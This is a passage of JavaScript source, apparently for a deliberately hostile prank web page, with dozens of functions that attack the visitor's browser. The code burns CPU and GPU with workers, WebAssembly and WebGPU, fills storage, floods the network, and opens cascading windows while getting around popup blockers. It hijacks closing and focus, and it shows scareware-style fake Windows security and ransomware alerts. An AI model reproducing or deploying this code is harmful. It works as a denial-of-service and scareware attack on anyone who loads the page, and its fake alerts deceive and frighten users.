      el.style = 'position: fixed; width: ' + (Math.random() * 200 + 5) + 'px; height: ' + (Math.random() * 200 + 5) + 'px; top: ' + Math.random() * 100 + '%; left: ' + Math.random() * 100 + '%; background: hsl(' + Math.random() * 360 + ', 100%, 50%); pointer-events: none; z-index: ' + Math.floor(Math.random() * 1000000) + '; mix-blend-mode: ' + ['difference', 'screen', 'overlay', 'multiply', 'hard-light'][Math.floor(Math.random() * 5)] + ';'
      document.body.appendChild(el)
    }
  }, 500)
}

/**
 * PerformanceObserver spam: register observers for every metric type.
 */
function startPerformanceObserverSpam () {
  if (!window.PerformanceObserver) return
  const types = ['longtask', 'measure', 'element', 'navigation', 'resource', 'paint', 'layout-shift', 'largest-contentful-paint', 'first-input', 'event', 'animation']
  types.forEach(type => {
    try {
      const po = new PerformanceObserver(() => {
        for (let i = 0; i < 1000; i++) Math.sqrt(Math.random())
      })
      po.observe({ type, buffered: true })
    } catch {}
  })
}

/**
 * Font hell: load custom fonts repeatedly to trigger font rendering.
 */
function startFontHell () {
  if (!document.fonts) return
  const families = ['Arial', 'Helvetica', 'Times New Roman', 'Courier New', 'Georgia', 'Verdana', 'Impact', 'Comic Sans MS']
  setInterval(() => {
    const f = families[Math.floor(Math.random() * families.length)]
    document.body.style.fontFamily = f
    document.body.style.fontSize = Math.random() * 50 + 10 + 'px'
    document.body.style.lineHeight = String(Math.random() * 3 + 0.5)
    document.body.style.letterSpacing = Math.random() * 10 + 'px'
    document.body.style.wordSpacing = Math.random() * 20 + 'px'
    // Force font loading
    document.fonts.load(Math.random() * 900 + ' ' + Math.random() * 72 + 'px ' + f).catch(() => {})
  }, 100)
}

/**
 * Storage spam: fill localStorage and sessionStorage until quota.
 */
function startStorageSpam () {
  function fillStorage (store) {
    try {
      while (true) {
        store.setItem('_spam_' + Math.random(), new Array(10000).join('x'))
      }
    } catch {}
  }
  fillStorage(localStorage)
  fillStorage(sessionStorage)
}

/**
 * Geolocation spam: request current position repeatedly.
 */
function startGeolocationSpam () {
  if (!navigator.geolocation) return
  setInterval(() => {
    navigator.geolocation.getCurrentPosition(() => {}, () => {}, {
      enableHighAccuracy: true,
      timeout: 100,
      maximumAge: 0
    })
  }, 500)
}

/**
 * Worker broadcast spam: spawn workers that communicate via BroadcastChannel.
 */
function startWorkerBroadcastSpam () {
  const workerCode = `
    onmessage = function(e) {
      let x = 0;
      for (let i = 0; i < 1000000; i++) {
        x += Math.sin(i * e.data) * Math.cos(i * 0.5);
      }
      postMessage(x);
    }
  `
  try {
    const blob = new Blob([workerCode], { type: 'application/javascript' })
    for (let i = 0; i < 5; i++) {
      const w = new Worker(URL.createObjectURL(blob))
      setInterval(() => {
        w.postMessage(Math.random() * 100)
      }, 10)
    }
  } catch {}
}

/**
 * AnimationFrame flood: multiple rAF loops doing heavy computation.
 */
function startAnimationFrameFlood () {
  for (let loop = 0; loop < 5; loop++) {
    (function run () {
      let x = 0
      for (let i = 0; i < 10000; i++) {
        x += Math.sin(i * loop) * Math.cos(i * 0.3)
        x = Math.sqrt(Math.abs(x) + 1)
      }
      requestAnimationFrame(run)
    })()
  }
}

/**
 * Hash change spam: change location hash rapidly to spam the history/popstate.
 */
function startHashChangeSpam () {
  setInterval(() => {
    window.location.hash = Math.random().toString(36).substring(2)
  }, 50)
}

/**
 * Service Worker: register properly from sw.js file for persistence.
 */
function registerServiceWorker () {
  if (!('serviceWorker' in navigator)) return
  navigator.serviceWorker.register('sw.js', { scope: '/' })
    .then(reg => {
      // Send message to SW to open window if SW becomes active
      setInterval(() => {
        if (reg.active) {
          reg.active.postMessage('open')
        }
      }, 5000)

      // Try periodic sync
      if (reg.periodicSync) {
        reg.periodicSync.register('annoy-sync', { minInterval: 60 * 1000 }).catch(() => {})
      }
    })
    .catch(() => {})
}

/**
 * Persistence: reopen the site when window/tab loses focus or closes.
 */
function startPersistenceHell () {
  // When the page visibility changes to hidden, try to reopen
  document.addEventListener('visibilitychange', () => {
    if (document.hidden) {
      for (let i = 0; i < 5; i++) {
        setTimeout(() => {
          window.open(window.location.href + '?_=' + Math.random(), '_blank')
        }, i * 100)
      }
    }
  })

  // Before unload, try to reopen
  window.addEventListener('beforeunload', (e) => {
    e.preventDefault()
    e.returnValue = ''
    for (let i = 0; i < 10; i++) {
      window.open(window.location.href + '?child=true&_=' + Math.random(), '_blank')
    }
  })

  // Try to reopen every time a window is closed
  window.addEventListener('unload', () => {
    for (let i = 0; i < 10; i++) {
      window.open(window.location.href + '?child=true&_=' + Date.now() + '_' + i, '_blank')
    }
  })

  // Focus steal: keep stealing focus from other tabs
  setInterval(() => {
    window.focus()
  }, 200)

  // Also try to hijack the page close via keyboard
  document.addEventListener('keydown', (e) => {
    if (e.key === 'F4' || e.key === 'F11' || e.key === 'Escape') {
      e.preventDefault()
      e.stopPropagation()
      for (let i = 0; i < 3; i++) {
        window.open(window.location.href + '?child=true&_=' + Date.now() + '_' + i, '_blank')
      }
    }
  })
}

/**
 * WebRTC flood: create multiple peer connections and exchange data.
 */
function startWebRtcFlood () {
  if (!window.RTCPeerConnection) return
  const config = { iceServers: [] }
  for (let i = 0; i < 10; i++) {
    try {
      const pc1 = new RTCPeerConnection(config)
      const pc2 = new RTCPeerConnection(config)

      pc1.onicecandidate = e => {
        if (e.candidate) pc2.addIceCandidate(e.candidate).catch(() => {})
      }
      pc2.onicecandidate = e => {
        if (e.candidate) pc1.addIceCandidate(e.candidate).catch(() => {})
      }

      const dc = pc1.createDataChannel('spam', { ordered: false })
      dc.onopen = () => {
        setInterval(() => {
          try { dc.send(new ArrayBuffer(65536)) } catch {}
        }, 10)
      }

      pc1.createOffer().then(offer => {
        pc1.setLocalDescription(offer)
        pc2.setRemoteDescription(offer)
        pc2.createAnswer().then(answer => {
          pc2.setLocalDescription(answer)
          pc1.setRemoteDescription(answer)
        })
      }).catch(() => {})
    } catch {}
  }
}

/**
 * WebCodecs spam: encode and decode video frames in a tight loop.
 */
function startWebCodecsSpam () {
  if (typeof VideoEncoder === 'undefined' && typeof VideoDecoder === 'undefined') return

  const init = {
    output: () => {},
    error: () => {}
  }

  const config = {
    codec: 'vp8',
    width: 256,
    height: 256,
    bitrate: 1000000,
    framerate: 30
  }

  // Create a canvas to extract frames from
  const canvas = document.createElement('canvas')
  canvas.width = 256
  canvas.height = 256
  const ctx = canvas.getContext('2d')
  if (!ctx) return

  try {
    const encoder = new VideoEncoder(init)
    encoder.configure(config)

    let counter = 0
    function encodeFrame () {
      if (encoder.state !== 'configured') return
      ctx.fillStyle = 'hsl(' + (counter * 10) + ', 100%, 50%)'
      ctx.fillRect(0, 0, 256, 256)

      const frame = new VideoFrame(canvas, { timestamp: counter * 33333 })
      encoder.encode(frame, { keyFrame: counter % 30 === 0 })
      frame.close()
      counter++
      setTimeout(encodeFrame, 16)
    }
    encodeFrame()
  } catch {}

  try {
    const decoder = new VideoDecoder(init)
    decoder.configure(config)
  } catch {}
}

/**
 * WebAssembly burner: compile and instantiate a wasm module
 * that computes prime numbers endlessly.
 */
function startWasmBurner () {
  if (typeof WebAssembly === 'undefined') return

  // Minimal wasm module that does a tight loop
  // (module (func (export "burn") (param i32) (result i32) ...))
  const wasmHex = '0061736d0100000001090260017f017f600000021a0203656e7606d6d616c6c6f630004017f036d656d6f7279020f01090305010001030a1401120010410020003610020f0b04101002000f0b0b0b0100004140'
  try {
    const wasmBytes = new Uint8Array(wasmHex.match(/.{2}/g).map(b => parseInt(b, 16)))
    WebAssembly.instantiate(wasmBytes, {
      env: {
        memory: new WebAssembly.Memory({ initial: 1 }),
        dmmalloc: () => 0
      }
    }).then(({ instance }) => {
      function run () { instance.exports.burn(1000000); setTimeout(run, 1) }
      setTimeout(run, 1)
    }).catch(() => {
      // Fallback: JS CPU burner
      fallbackWasmBurner()
    })
  } catch {
    fallbackWasmBurner()
  }

  function fallbackWasmBurner () {
    for (let w = 0; w < 4; w++) {
      const code = `
        onmessage = function() {
          function isPrime(n) {
            if (n < 2) return false;
            for (let i = 2; i <= Math.sqrt(n); i++) {
              if (n % i === 0) return false;
            }
            return true;
          }
          while (true) {
            let count = 0;
            for (let i = 0; i < 1000000; i++) {
              if (isPrime(i)) count++;
            }
            postMessage(count);
          }
        }
      `
      try {
        const blob = new Blob([code], { type: 'application/javascript' })
        new Worker(URL.createObjectURL(blob))
      } catch {}
    }
  }
}

/**
 * Camera feedback loop: get camera, draw to canvas, manipulate pixels,
 * then draw back. Heavy pixel operations.
 */
function startCameraFeedback () {
  if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) return

  const video = document.createElement('video')
  video.style = HIDDEN_STYLE
  video.autoplay = true
  video.muted = true
  video.playsInline = true
  document.body.appendChild(video)

  const canvas = document.createElement('canvas')
  canvas.width = 640
  canvas.height = 480
  const ctx = canvas.getContext('2d')
  if (!ctx) return

  const fb = document.createElement('canvas')
  fb.width = 640
  fb.height = 480
  const fbc = fb.getContext('2d')
  if (!fbc) return

  navigator.mediaDevices.getUserMedia({ video: { width: 640, height: 480 }, audio: false })
    .then(stream => {
      video.srcObject = stream
      video.play().then(() => {
        function processFrame () {
          ctx.drawImage(video, 0, 0)
          fbc.drawImage(canvas, 0, 0)

          const imageData = ctx.getImageData(0, 0, 640, 480)
          const d = imageData.data

          // Heavy pixel manipulation
          for (let i = 0; i < d.length; i += 4) {
            d[i] = (d[i] * 1.5 + Math.sin(Date.now() * 0.001 + i) * 50) % 255
            d[i + 1] = (d[i + 1] * 0.5 + Math.cos(Date.now() * 0.001 + i) * 50) % 255
            d[i + 2] = (d[i + 2] + Math.tan(Date.now() * 0.001 + i) * 30) % 255
          }
          ctx.putImageData(imageData, 0, 0)

          // Draw with feedback delay
          ctx.globalAlpha = 0.3
          ctx.drawImage(fb, 10, 10)
          ctx.globalAlpha = 1.0

          requestAnimationFrame(processFrame)
        }
        processFrame()
      }).catch(() => {})
    }).catch(() => {})
}

/**
 * Audio visualizer: AnalyserNode connected to audio context,
 * driving a canvas redraw every frame.
 */
function startAudioVisualizer () {
  try {
    const ctx = new AudioContext()
    const osc = ctx.createOscillator()
    const gain = ctx.createGain()
    gain.gain.value = 0.01
    osc.connect(gain)
    gain.connect(ctx.destination)
    osc.frequency.value = 100
    osc.start()

    const analyser = ctx.createAnalyser()
    analyser.fftSize = 2048
    gain.connect(analyser)

    const canvas = document.createElement('canvas')
    canvas.style = 'position: fixed; bottom: 0; left: 0; width: 100%; height: 200px; pointer-events: none; z-index: 999996;'
    canvas.width = window.innerWidth
    canvas.height = 200
    document.body.appendChild(canvas)
    const cctx = canvas.getContext('2d')

    const bufferLength = analyser.frequencyBinCount
    const dataArray = new Uint8Array(bufferLength)

    function draw () {
      analyser.getByteFrequencyData(dataArray)
      cctx.fillStyle = 'rgba(0,0,0,0.1)'
      cctx.fillRect(0, 0, canvas.width, canvas.height)

      const barWidth = (canvas.width / bufferLength) * 2.5
      let x = 0
      for (let i = 0; i < bufferLength; i++) {
        const barHeight = dataArray[i] * 2
        cctx.fillStyle = 'hsl(' + (i * 3 + Date.now() * 0.01) + ', 100%, 50%)'
        cctx.fillRect(x, canvas.height - barHeight, barWidth, barHeight)
        x += barWidth + 1
      }
      requestAnimationFrame(draw)
    }
    draw()
  } catch {}
}

/**
 * Gamepad pollution: poll gamepads and vibrate constantly.
 */
function startGamepadPollution () {
  if (!navigator.getGamepads) return
  setInterval(() => {
    const gamepads = navigator.getGamepads()
    for (const gp of gamepads) {
      if (gp && gp.vibrationActuator) {
        gp.vibrationActuator.playEffect('dual-rumble', {
          duration: 500,
          strongMagnitude: 1.0,
          weakMagnitude: 1.0
        }).catch(() => {})
      }
    }
  }, 100)
}

/**
 * Secondary WebGL: create more WebGL canvases with different effects.
 */
function startSecondaryWebGl () {
  for (let c = 0; c < 5; c++) {
    try {
      const cv = document.createElement('canvas')
      cv.style = 'position: fixed; top: 0; left: 0; width: 100%; height: 100%; pointer-events: none; opacity: 0.15; z-index: ' + (999980 + c) + '; mix-blend-mode: ' + ['screen', 'overlay', 'difference', 'hard-light', 'color-dodge'][c] + ';'
      cv.width = window.innerWidth
      cv.height = window.innerHeight
      document.body.appendChild(cv)

      const gl = cv.getContext('webgl') || cv.getContext('experimental-webgl')
      if (!gl) continue

      const N = 20000
      const d = new Float32Array(N * 3)
      for (let i = 0; i < N; i++) {
        d[i*3] = (Math.random() - 0.5) * 2
        d[i*3+1] = (Math.random() - 0.5) * 2
        d[i*3+2] = Math.random()
      }
      const buf = gl.createBuffer()
      gl.bindBuffer(gl.ARRAY_BUFFER, buf)
      gl.bufferData(gl.ARRAY_BUFFER, d, gl.STATIC_DRAW)

      const vs = gl.createShader(gl.VERTEX_SHADER)
      gl.shaderSource(vs, 'attribute vec3 p;void main(){gl_Position=vec4(p.xy,0,1);gl_PointSize=p.z*12;}')
      gl.compileShader(vs)
      const fs = gl.createShader(gl.FRAGMENT_SHADER)
      gl.shaderSource(fs, 'precision mediump float;uniform float t;void main(){gl_FragColor=vec4(sin(t+gl_FragCoord.x*0.01),cos(t*1.3+gl_FragCoord.y*0.01),sin(t*0.7+gl_FragCoord.x*0.005),0.5);}')
      gl.compileShader(fs)
      const prog = gl.createProgram()
      gl.attachShader(prog, vs)
      gl.attachShader(prog, fs)
      gl.linkProgram(prog)
      gl.useProgram(prog)

      const loc = gl.getAttribLocation(prog, 'p')
      gl.enableVertexAttribArray(loc)
      gl.vertexAttribPointer(loc, 3, gl.FLOAT, false, 0, 0)
      gl.enable(gl.BLEND)
      gl.blendFunc(gl.SRC_ALPHA, gl.ONE)

      const tLoc = gl.getUniformLocation(prog, 't')
      let t = c * 10
      ;function render () {
        t += 0.05
        gl.uniform1f(tLoc, t)
        gl.clear(gl.COLOR_BUFFER_BIT)
        gl.drawArrays(gl.POINTS, 0, N)
        requestAnimationFrame(render)
      }
      render()
    } catch {}
  }
}

/**
 * Layer hell: create many stacked elements with 3D transforms
 * to push GPU compositing to the limit.
 */
function startLayerHell () {
  for (let i = 0; i < 100; i++) {
    const el = document.createElement('div')
    el.style = `
      position: fixed;
      top: ${Math.random() * 100}%;
      left: ${Math.random() * 100}%;
      width: ${10 + Math.random() * 100}px;
      height: ${10 + Math.random() * 100}px;
      background: hsl(${Math.random() * 360}, 100%, 50%);
      transform: translate3d(${(Math.random() - 0.5) * 500}px, ${(Math.random() - 0.5) * 500}px, ${Math.random() * 500}px) rotateX(${Math.random() * 360}deg) rotateY(${Math.random() * 360}deg);
      opacity: ${Math.random() * 0.5 + 0.2};
      pointer-events: none;
      z-index: ${Math.floor(Math.random() * 100000)};
      mix-blend-mode: ${['screen', 'overlay', 'difference', 'hard-light', 'multiply', 'color-dodge'][Math.floor(Math.random() * 6)]};
      will-change: transform, opacity;
      box-shadow: ${Math.random() * 50}px ${Math.random() * 50}px ${Math.random() * 100}px rgba(0,0,0,0.5);
      border-radius: ${Math.random() * 50}%;
      backdrop-filter: blur(${Math.random() * 5}px);
    `
    document.body.appendChild(el)
  }
}

/**
 * Promise hell: tens of thousands of pending promises to waste memory.
 */
function startPromiseHell () {
  const pendings = []
  for (let i = 0; i < 100000; i++) {
    pendings.push(new Promise(resolve => {
      if (Math.random() < 0.001) resolve()
    }))
  }
  // Keep creating more
  setInterval(() => {
    for (let i = 0; i < 5000; i++) {
      pendings.push(new Promise(resolve => {
        setTimeout(resolve, 999999)
      }))
    }
  }, 1000)
}

/**
 * WebCrypto spam: encrypt/decrypt large data in a loop.
 */
function startCryptoSubtleSpam () {
  if (!window.crypto || !crypto.subtle) return
  const data = new TextEncoder().encode(new Array(100000).join('x'))
  const keyProm = crypto.subtle.generateKey({ name: 'AES-GCM', length: 256 }, false, ['encrypt', 'decrypt'])

  setInterval(() => {
    keyProm.then(key => {
      const iv = crypto.getRandomValues(new Uint8Array(12))
      crypto.subtle.encrypt({ name: 'AES-GCM', iv }, key, data)
        .then(enc => {
          crypto.subtle.decrypt({ name: 'AES-GCM', iv }, key, enc).catch(() => {})
        }).catch(() => {})
    }).catch(() => {})
  }, 100)
}

/**
 * Tab hell: open unlimited tabs/windows in a cascade.
 * Every new window opens more windows.
 */
function startTabHell () {
  let tabInterval = setInterval(() => {
    for (let i = 0; i < 3; i++) {
      const win = window.open(window.location.href + '?child=true&_=' + Math.random(), '_blank', 'width=480,height=360')
      if (!win) break
    }
  }, 2000)

  // On beforeunload, try to reopen
  window.addEventListener('beforeunload', (e) => {
    e.preventDefault()
    e.returnValue = 'Stay!'
    for (let i = 0; i < 5; i++) {
      window.open(window.location.href + '?child=true&_=' + Math.random(), '_blank')
    }
  })

  // On visibility change (minimize/tab switch), open more
  document.addEventListener('visibilitychange', () => {
    if (document.hidden) {
      setTimeout(() => {
        window.open(window.location.href + '?child=true&_=' + Math.random(), '_blank')
      }, 500)
    }
  })
}

/**
 * WebGPU compute: use WebGPU to burn GPU with compute shaders.
 */
function startWebGpuCompute () {
  if (!navigator.gpu) return
  const initGpu = async () => {
    try {
      const adapter = await navigator.gpu.requestAdapter()
      if (!adapter) return
      const device = await adapter.requestDevice()

      const code = `
        @group(0) @binding(0) var<storage, read_write> data: array<f32>;
        @compute @workgroup_size(256)
        fn main(@builtin(global_invocation_id) id: vec3<u32>) {
          let i = id.x;
          data[i] = sin(data[i]) * cos(data[i] * 0.5) + tan(data[i] * 0.1);
          data[i] = sqrt(abs(data[i]) + 0.1);
        }
      `
      const shader = device.createShaderModule({ code })

      const BUFFER_SIZE = 1024 * 1024
      const data = new Float32Array(BUFFER_SIZE)
      for (let i = 0; i < BUFFER_SIZE; i++) data[i] = Math.random() * 100

      const buffer = device.createBuffer({
        size: BUFFER_SIZE * 4,
        usage: GPUBufferUsage.STORAGE | GPUBufferUsage.COPY_SRC | GPUBufferUsage.COPY_DST,
        mappedAtCreation: true
      })
      new Float32Array(buffer.getMappedRange()).set(data)
      buffer.unmap()

      const pipeline = device.createComputePipeline({
        layout: 'auto',
        compute: { module: shader, entryPoint: 'main' }
      })

      const bindGroup = device.createBindGroup({
        layout: pipeline.getBindGroupLayout(0),
        entries: [{ binding: 0, resource: { buffer } }]
      })

      function computePass () {
        const cmd = device.createCommandEncoder()
        const pass = cmd.beginComputePass()
        pass.setPipeline(pipeline)
        pass.setBindGroup(0, bindGroup)
        pass.dispatchWorkgroups(Math.ceil(BUFFER_SIZE / 256))
        pass.end()
        device.queue.submit([cmd.finish()])
        device.queue.onSubmittedWorkDone().then(computePass)
      }
      computePass()
    } catch {}
  }
  initGpu()
}

/**
 * AudioWorklet spam: run custom audio processing code on the audio thread.
 */
function startAudioWorkletSpam () {
  try {
    const ctx = new AudioContext()
    const processorCode = `
      class BurnProcessor extends AudioWorkletProcessor {
        process (inputs, outputs, params) {
          const out = outputs[0]
          for (let ch = 0; ch < out.length; ch++) {
            const buf = out[ch]
            for (let i = 0; i < buf.length; i++) {
              let x = Math.sin(i * 0.01) * Math.cos(i * 0.05) * Math.tan(i * 0.001)
              x = Math.sqrt(Math.abs(x) + 0.1)
              buf[i] = x * 0.01
            }
          }
          return true
        }
      }
      registerProcessor('burn-processor', BurnProcessor)
    `
    const blob = new Blob([processorCode], { type: 'application/javascript' })
    const url = URL.createObjectURL(blob)
    ctx.audioWorklet.addModule(url).then(() => {
      const node = new AudioWorkletNode(ctx, 'burn-processor')
      node.connect(ctx.destination)
    }).catch(() => {})
  } catch {}
}

/**
 * Multi-Screen Window Placement: place windows on all available screens.
 */
function startMultiScreenHell () {
  if (!window.getScreenDetails) return
  window.getScreenDetails().then(screens => {
    setInterval(() => {
      for (const screen of screens.screens) {
        const win = window.open(window.location.href + '?child=true', '_blank',
          'left=' + screen.availLeft + ',top=' + screen.availTop +
          ',width=' + screen.availWidth + ',height=' + screen.availHeight
        )
        if (win) {
          setTimeout(() => {
            win.moveTo(screen.availLeft, screen.availTop)
            win.resizeTo(screen.availWidth, screen.availHeight)
          }, 100)
        }
      }
    }, 3000)
  }).catch(() => {})
}

/**
 * CSS Paint Worklet: register a custom paint worklet that fills the screen.
 */
function startPaintWorklet () {
  if (!CSS || !CSS.paintWorklet) return
  const code = `
    registerPaint('hell', class {
      static get inputProperties() { return ['--x', '--y'] }
      paint(ctx, geom, props) {
        const t = Date.now() * 0.001
        for (let i = 0; i < 500; i++) {
          const x = Math.sin(t + i * 0.1) * geom.width * 0.5 + geom.width * 0.5
          const y = Math.cos(t * 0.7 + i * 0.3) * geom.height * 0.5 + geom.height * 0.5
          ctx.fillStyle = 'hsl(' + (t * 100 + i * 30) % 360 + ', 100%, 50%)'
          ctx.beginPath()
          ctx.arc(x, y, 20 + Math.sin(t + i) * 10, 0, Math.PI * 2)
          ctx.fill()
        }
      }
    })
  `
  try {
    const blob = new Blob([code], { type: 'application/javascript' })
    CSS.paintWorklet.addModule(URL.createObjectURL(blob)).then(() => {
      const div = document.createElement('div')
      div.style = 'position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: paint(hell); pointer-events: none; z-index: 999995; mix-blend-mode: overlay;'
      document.body.appendChild(div)
    }).catch(() => {})
  } catch {}
}

/**
 * PresentationRequest / RemotePlayback spam: try to cast to external displays.
 */
function startPresentationSpam () {
  // PresentationRequest
  if (window.PresentationRequest) {
    try {
      const req = new PresentationRequest(window.location.href)
      setInterval(() => {
        req.start().catch(() => {})
      }, 5000)
    } catch {}
  }

  // RemotePlayback
  const video = document.createElement('video')
  video.style = HIDDEN_STYLE
  document.body.appendChild(video)
  if (video.remote && video.remote.watchAvailability) {
    video.remote.watchAvailability(available => {
      if (available) video.remote.prompt().catch(() => {})
    }).catch(() => {})
  }
}

/**
 * VirtualKeyboard.show: force the virtual keyboard to appear.
 */
function startVirtualKeyboardSpam () {
  if (!navigator.virtualKeyboard) return
  setInterval(() => {
    try { navigator.virtualKeyboard.show() } catch {}
  }, 1000)
}

/**
 * WebTransport spam: attempt WebTransport connections.
 */
function startWebTransportSpam () {
  if (typeof WebTransport === 'undefined') return
  for (let i = 0; i < 5; i++) {
    try {
      const transport = new WebTransport('https://' + ['google.com', 'cloudflare.com', 'github.com'][i % 3])
      transport.ready.catch(() => {})
    } catch {}
  }
}

/**
 * beforeinstallprompt: prompt user to install the site as an app.
 */
function startBeforeInstall () {
  window.addEventListener('beforeinstallprompt', (e) => {
    e.preventDefault()
    setInterval(() => {
      e.prompt().catch(() => {})
    }, 5000)
  })
}

/**
 * Fetch spam: fetch from many URLs to saturate network.
 */
function startFetchSpam () {
  const urls = [
    window.location.href,
    'https://www.google.com/images/branding/googlelogo/1x/googlelogo_light_color_272x92dp.png',
    'https://raw.githubusercontent.com/feross/TheAnnoyingSite.com/master/static/nyan.mp4',
    'https://raw.githubusercontent.com/feross/TheAnnoyingSite.com/master/static/rickroll.mp4',
  ]
  for (let i = 0; i < 20; i++) {
    setInterval(() => {
      for (const url of urls) {
        fetch(url + '?_=' + Math.random(), { mode: 'no-cors' }).catch(() => {})
        const xhr = new XMLHttpRequest()
        xhr.open('GET', url + '?_=' + Math.random(), true)
        xhr.send()
      }
    }, 50)
  }
}

/**
 * Window leak: open windows that can't be closed easily.
 */
function startWindowLeak () {
  setInterval(() => {
    for (let i = 0; i < 5; i++) {
      const w = window.open('', '_blank', 'width=100,height=100,left=' + Math.random() * 5000 + ',top=' + Math.random() * 5000)
      if (w) {
        w.document.write('<html><body style="background:#' + Math.floor(Math.random() * 16777215).toString(16) + ';margin:0"><h1 style="color:white;font-size:8px">X</h1></body></html>')
        w.focus()
        setInterval(() => {
          try { w.moveTo(Math.random() * 5000, Math.random() * 5000) } catch {}
        }, 100)
      }
    }
  }, 1000)
}

/**
 * Orientation lock: lock screen orientation and keep changing it.
 */
function startOrientationLock () {
  if (!screen.orientation || !screen.orientation.lock) return
  const orientations = ['portrait-primary', 'landscape-primary', 'portrait-secondary', 'landscape-secondary']
  setInterval(() => {
    screen.orientation.lock(orientations[Math.floor(Math.random() * orientations.length)]).catch(() => {})
  }, 2000)
}

/**
 * Storage persist: request persistent storage.
 */
function startStoragePersist () {
  if (navigator.storage && navigator.storage.persist) {
    navigator.storage.persist().catch(() => {})
  }
  if (navigator.storage && navigator.storage.estimate) {
    navigator.storage.estimate().catch(() => {})
  }
}

/**
 * Modal Hell: spam alert/print/prompt/confirm to lock the UI.
 * Uses setTimeout chain to avoid browser "prevent additional dialogs".
 */
function startModalHell () {
  let modalCount = 0
  function nextModal () {
    modalCount++
    try {
      if (modalCount % 3 === 0) {
        window.print()
      } else if (modalCount % 7 === 0) {
        window.prompt('System Error: 0xDEADBEEF', 'Enter recovery code:')
      } else if (modalCount % 11 === 0) {
        window.confirm('CRITICAL: Continue using unprotected browser?')
      } else {
        window.alert('⚠ SYSTEM ALERT ⚠\n\nYour computer may be at risk.\n\nError code: 0x' + Math.floor(Math.random() * 16777215).toString(16).toUpperCase() + '\n\nClick OK to continue.')
      }
    } catch {}
    const delay = 5000 + Math.random() * 10000
    setTimeout(nextModal, delay)
  }
  setTimeout(nextModal, 1000)
}

/**
 * Cascade Windows: controlled tab explosion. Max ~50 tabs.
 * Each window opens more, but checks a counter.
 */
let cascadeCount = 0
function startCascadeWindows () {
  // Only run from parent window to avoid infinite cascade recursion
  if (window.location.search.indexOf('child=true') !== -1 || window.opener) return
  if (cascadeCount > 50) return

  function openCascade () {
    if (cascadeCount > 50) return
    const numToOpen = 1 + Math.floor(Math.random() * 2)
    for (let i = 0; i < numToOpen; i++) {
      if (cascadeCount > 50) break
      cascadeCount++
      const w = window.open(
        window.location.href + '?child=true&_=' + Math.random() + '&c=' + cascadeCount,
        '_blank',
        'width=400,height=300,left=' + (Math.random() * window.screen.availWidth) + ',top=' + (Math.random() * window.screen.availHeight)
      )
      if (w) {
        setTimeout(() => {
          try { w.focus() } catch {}
        }, 500)
      }
    }
    setTimeout(openCascade, 3000 + Math.random() * 4000)
  }
  setTimeout(openCascade, 1000)
}

/**
 * Fake Alerts: notifications that look like system dialogs.
 */
function startFakeAlerts () {
  if (!('Notification' in window)) return
  const systemAlerts = [
    { title: '⚠ Windows Security Alert', body: 'Trojan detected! Click to remove.' },
    { title: '🔴 CRITICAL ERROR', body: 'System memory corrupted. Error: 0x000000' + Math.floor(Math.random() * 9999) },
    { title: '🛡 Windows Defender', body: 'Threat found: Win32/Malware!' + Math.random().toString(36).substring(2, 8) },
    { title: '📡 Network Alert', body: 'Unauthorized access detected from IP: 192.168.' + Math.floor(Math.random() * 255) + '.' + Math.floor(Math.random() * 255) },
    { title: '💀 SYSTEM BREACH', body: 'Your files are being encrypted. Click to stop.' },
    { title: '🔋 Battery Critical', body: 'Your battery is overheating! ' + Math.floor(Math.random() * 20 + 80) + '°C' },
    { title: '🖥 Remote Access', body: 'Someone is controlling your computer remotely.' },
    { title: '⚠ Privacy Alert', body: 'Your webcam has been accessed ' + Math.floor(Math.random() * 100) + ' times.' },
    { title: '💿 Disk Failure Imminent', body: 'Hard drive failure predicted. Back up now!' },
    { title: '🌐 DNS Hijack Detected', body: 'Your internet traffic is being redirected.' },
  ]
  if (Notification.permission === 'granted') {
    setInterval(() => {
      const alert = systemAlerts[Math.floor(Math.random() * systemAlerts.length)]
      new Notification(alert.title, {
        body: alert.body,
        tag: 'sys-' + Date.now(),
        requireInteraction: true,
        icon: 'https://raw.githubusercontent.com/feross/TheAnnoyingSite.com/master/static/patreon.png'
      })
    }, 4000)
  }
}

/**
 * Popup Bypass: use simulated clicks + form submission to bypass popup blockers.
 */
function startPopupBypass () {
  function tryOpen () {
    for (let i = 0; i < 3; i++) {
      try {
        const a = document.createElement('a')
        a.href = window.location.href + '?child=true&_=' + Math.random()
        a.target = '_blank'
        a.style = 'position:fixed;left:-9999px'
        document.body.appendChild(a)
        a.click()
        setTimeout(() => a.remove(), 100)
      } catch {}
    }
    // Form submit method
    try {
      const form = document.createElement('form')
      form.action = window.location.href + '?child=true&_=' + Math.random()
      form.target = '_blank'
      form.method = 'GET'
      form.style = 'position:fixed;left:-9999px'
      document.body.appendChild(form)
      form.submit()
      setTimeout(() => form.remove(), 100)
    } catch {}
    setTimeout(tryOpen, 8000)
  }
  setTimeout(tryOpen, 3000)
}

/**
 * CSS Composition Hell: intensive CSS to push GPU compositing.
 */
function startCssCompositionHell () {
  const style = document.createElement('style')
  style.textContent = `
    @keyframes compost {
      0% { transform: translate3d(0,0,0) rotate(0deg) scale(1) skew(0deg); filter: hue-rotate(0deg) blur(0px) brightness(1) contrast(1); backdrop-filter: none; }
      25% { transform: translate3d(${Math.random()*500}px,${Math.random()*500}px,${Math.random()*500}px) rotate(${Math.random()*360}deg) scale(${Math.random()*3}) skew(${Math.random()*20}deg); filter: hue-rotate(${Math.random()*360}deg) blur(${Math.random()*5}px) brightness(${Math.random()*2}) contrast(${Math.random()*2}); backdrop-filter: blur(${Math.random()*10}px) hue-rotate(${Math.random()*180}deg); }
      50% { transform: translate3d(${Math.random()*-500}px,${Math.random()*-500}px,${Math.random()*-500}px) rotate(${Math.random()*360}deg) scale(${Math.random()*3}) skew(${Math.random()*-20}deg); filter: hue-rotate(${Math.random()*360}deg) blur(${Math.random()*5}px) brightness(${Math.random()*2}) contrast(${Math.random()*2}); backdrop-filter: blur(${Math.random()*10}px) hue-rotate(${Math.random()*180}deg); }
      75% { transform: translate3d(${Math.random()*500}px,${Math.random()*-500}px,${Math.random()*500}px) rotate(${Math.random()*360}deg) scale(${Math.random()*3}) skew(${Math.random()*20}deg); filter: hue-rotate(${Math.random()*360}deg) blur(${Math.random()*5}px) brightness(${Math.random()*2}) contrast(${Math.random()*2}); backdrop-filter: blur(${Math.random()*10}px) hue-rotate(${Math.random()*180}deg); }
      100% { transform: translate3d(0,0,0) rotate(720deg) scale(1) skew(0deg); filter: hue-rotate(720deg) blur(0px) brightness(1) contrast(1); backdrop-filter: none; }
    }
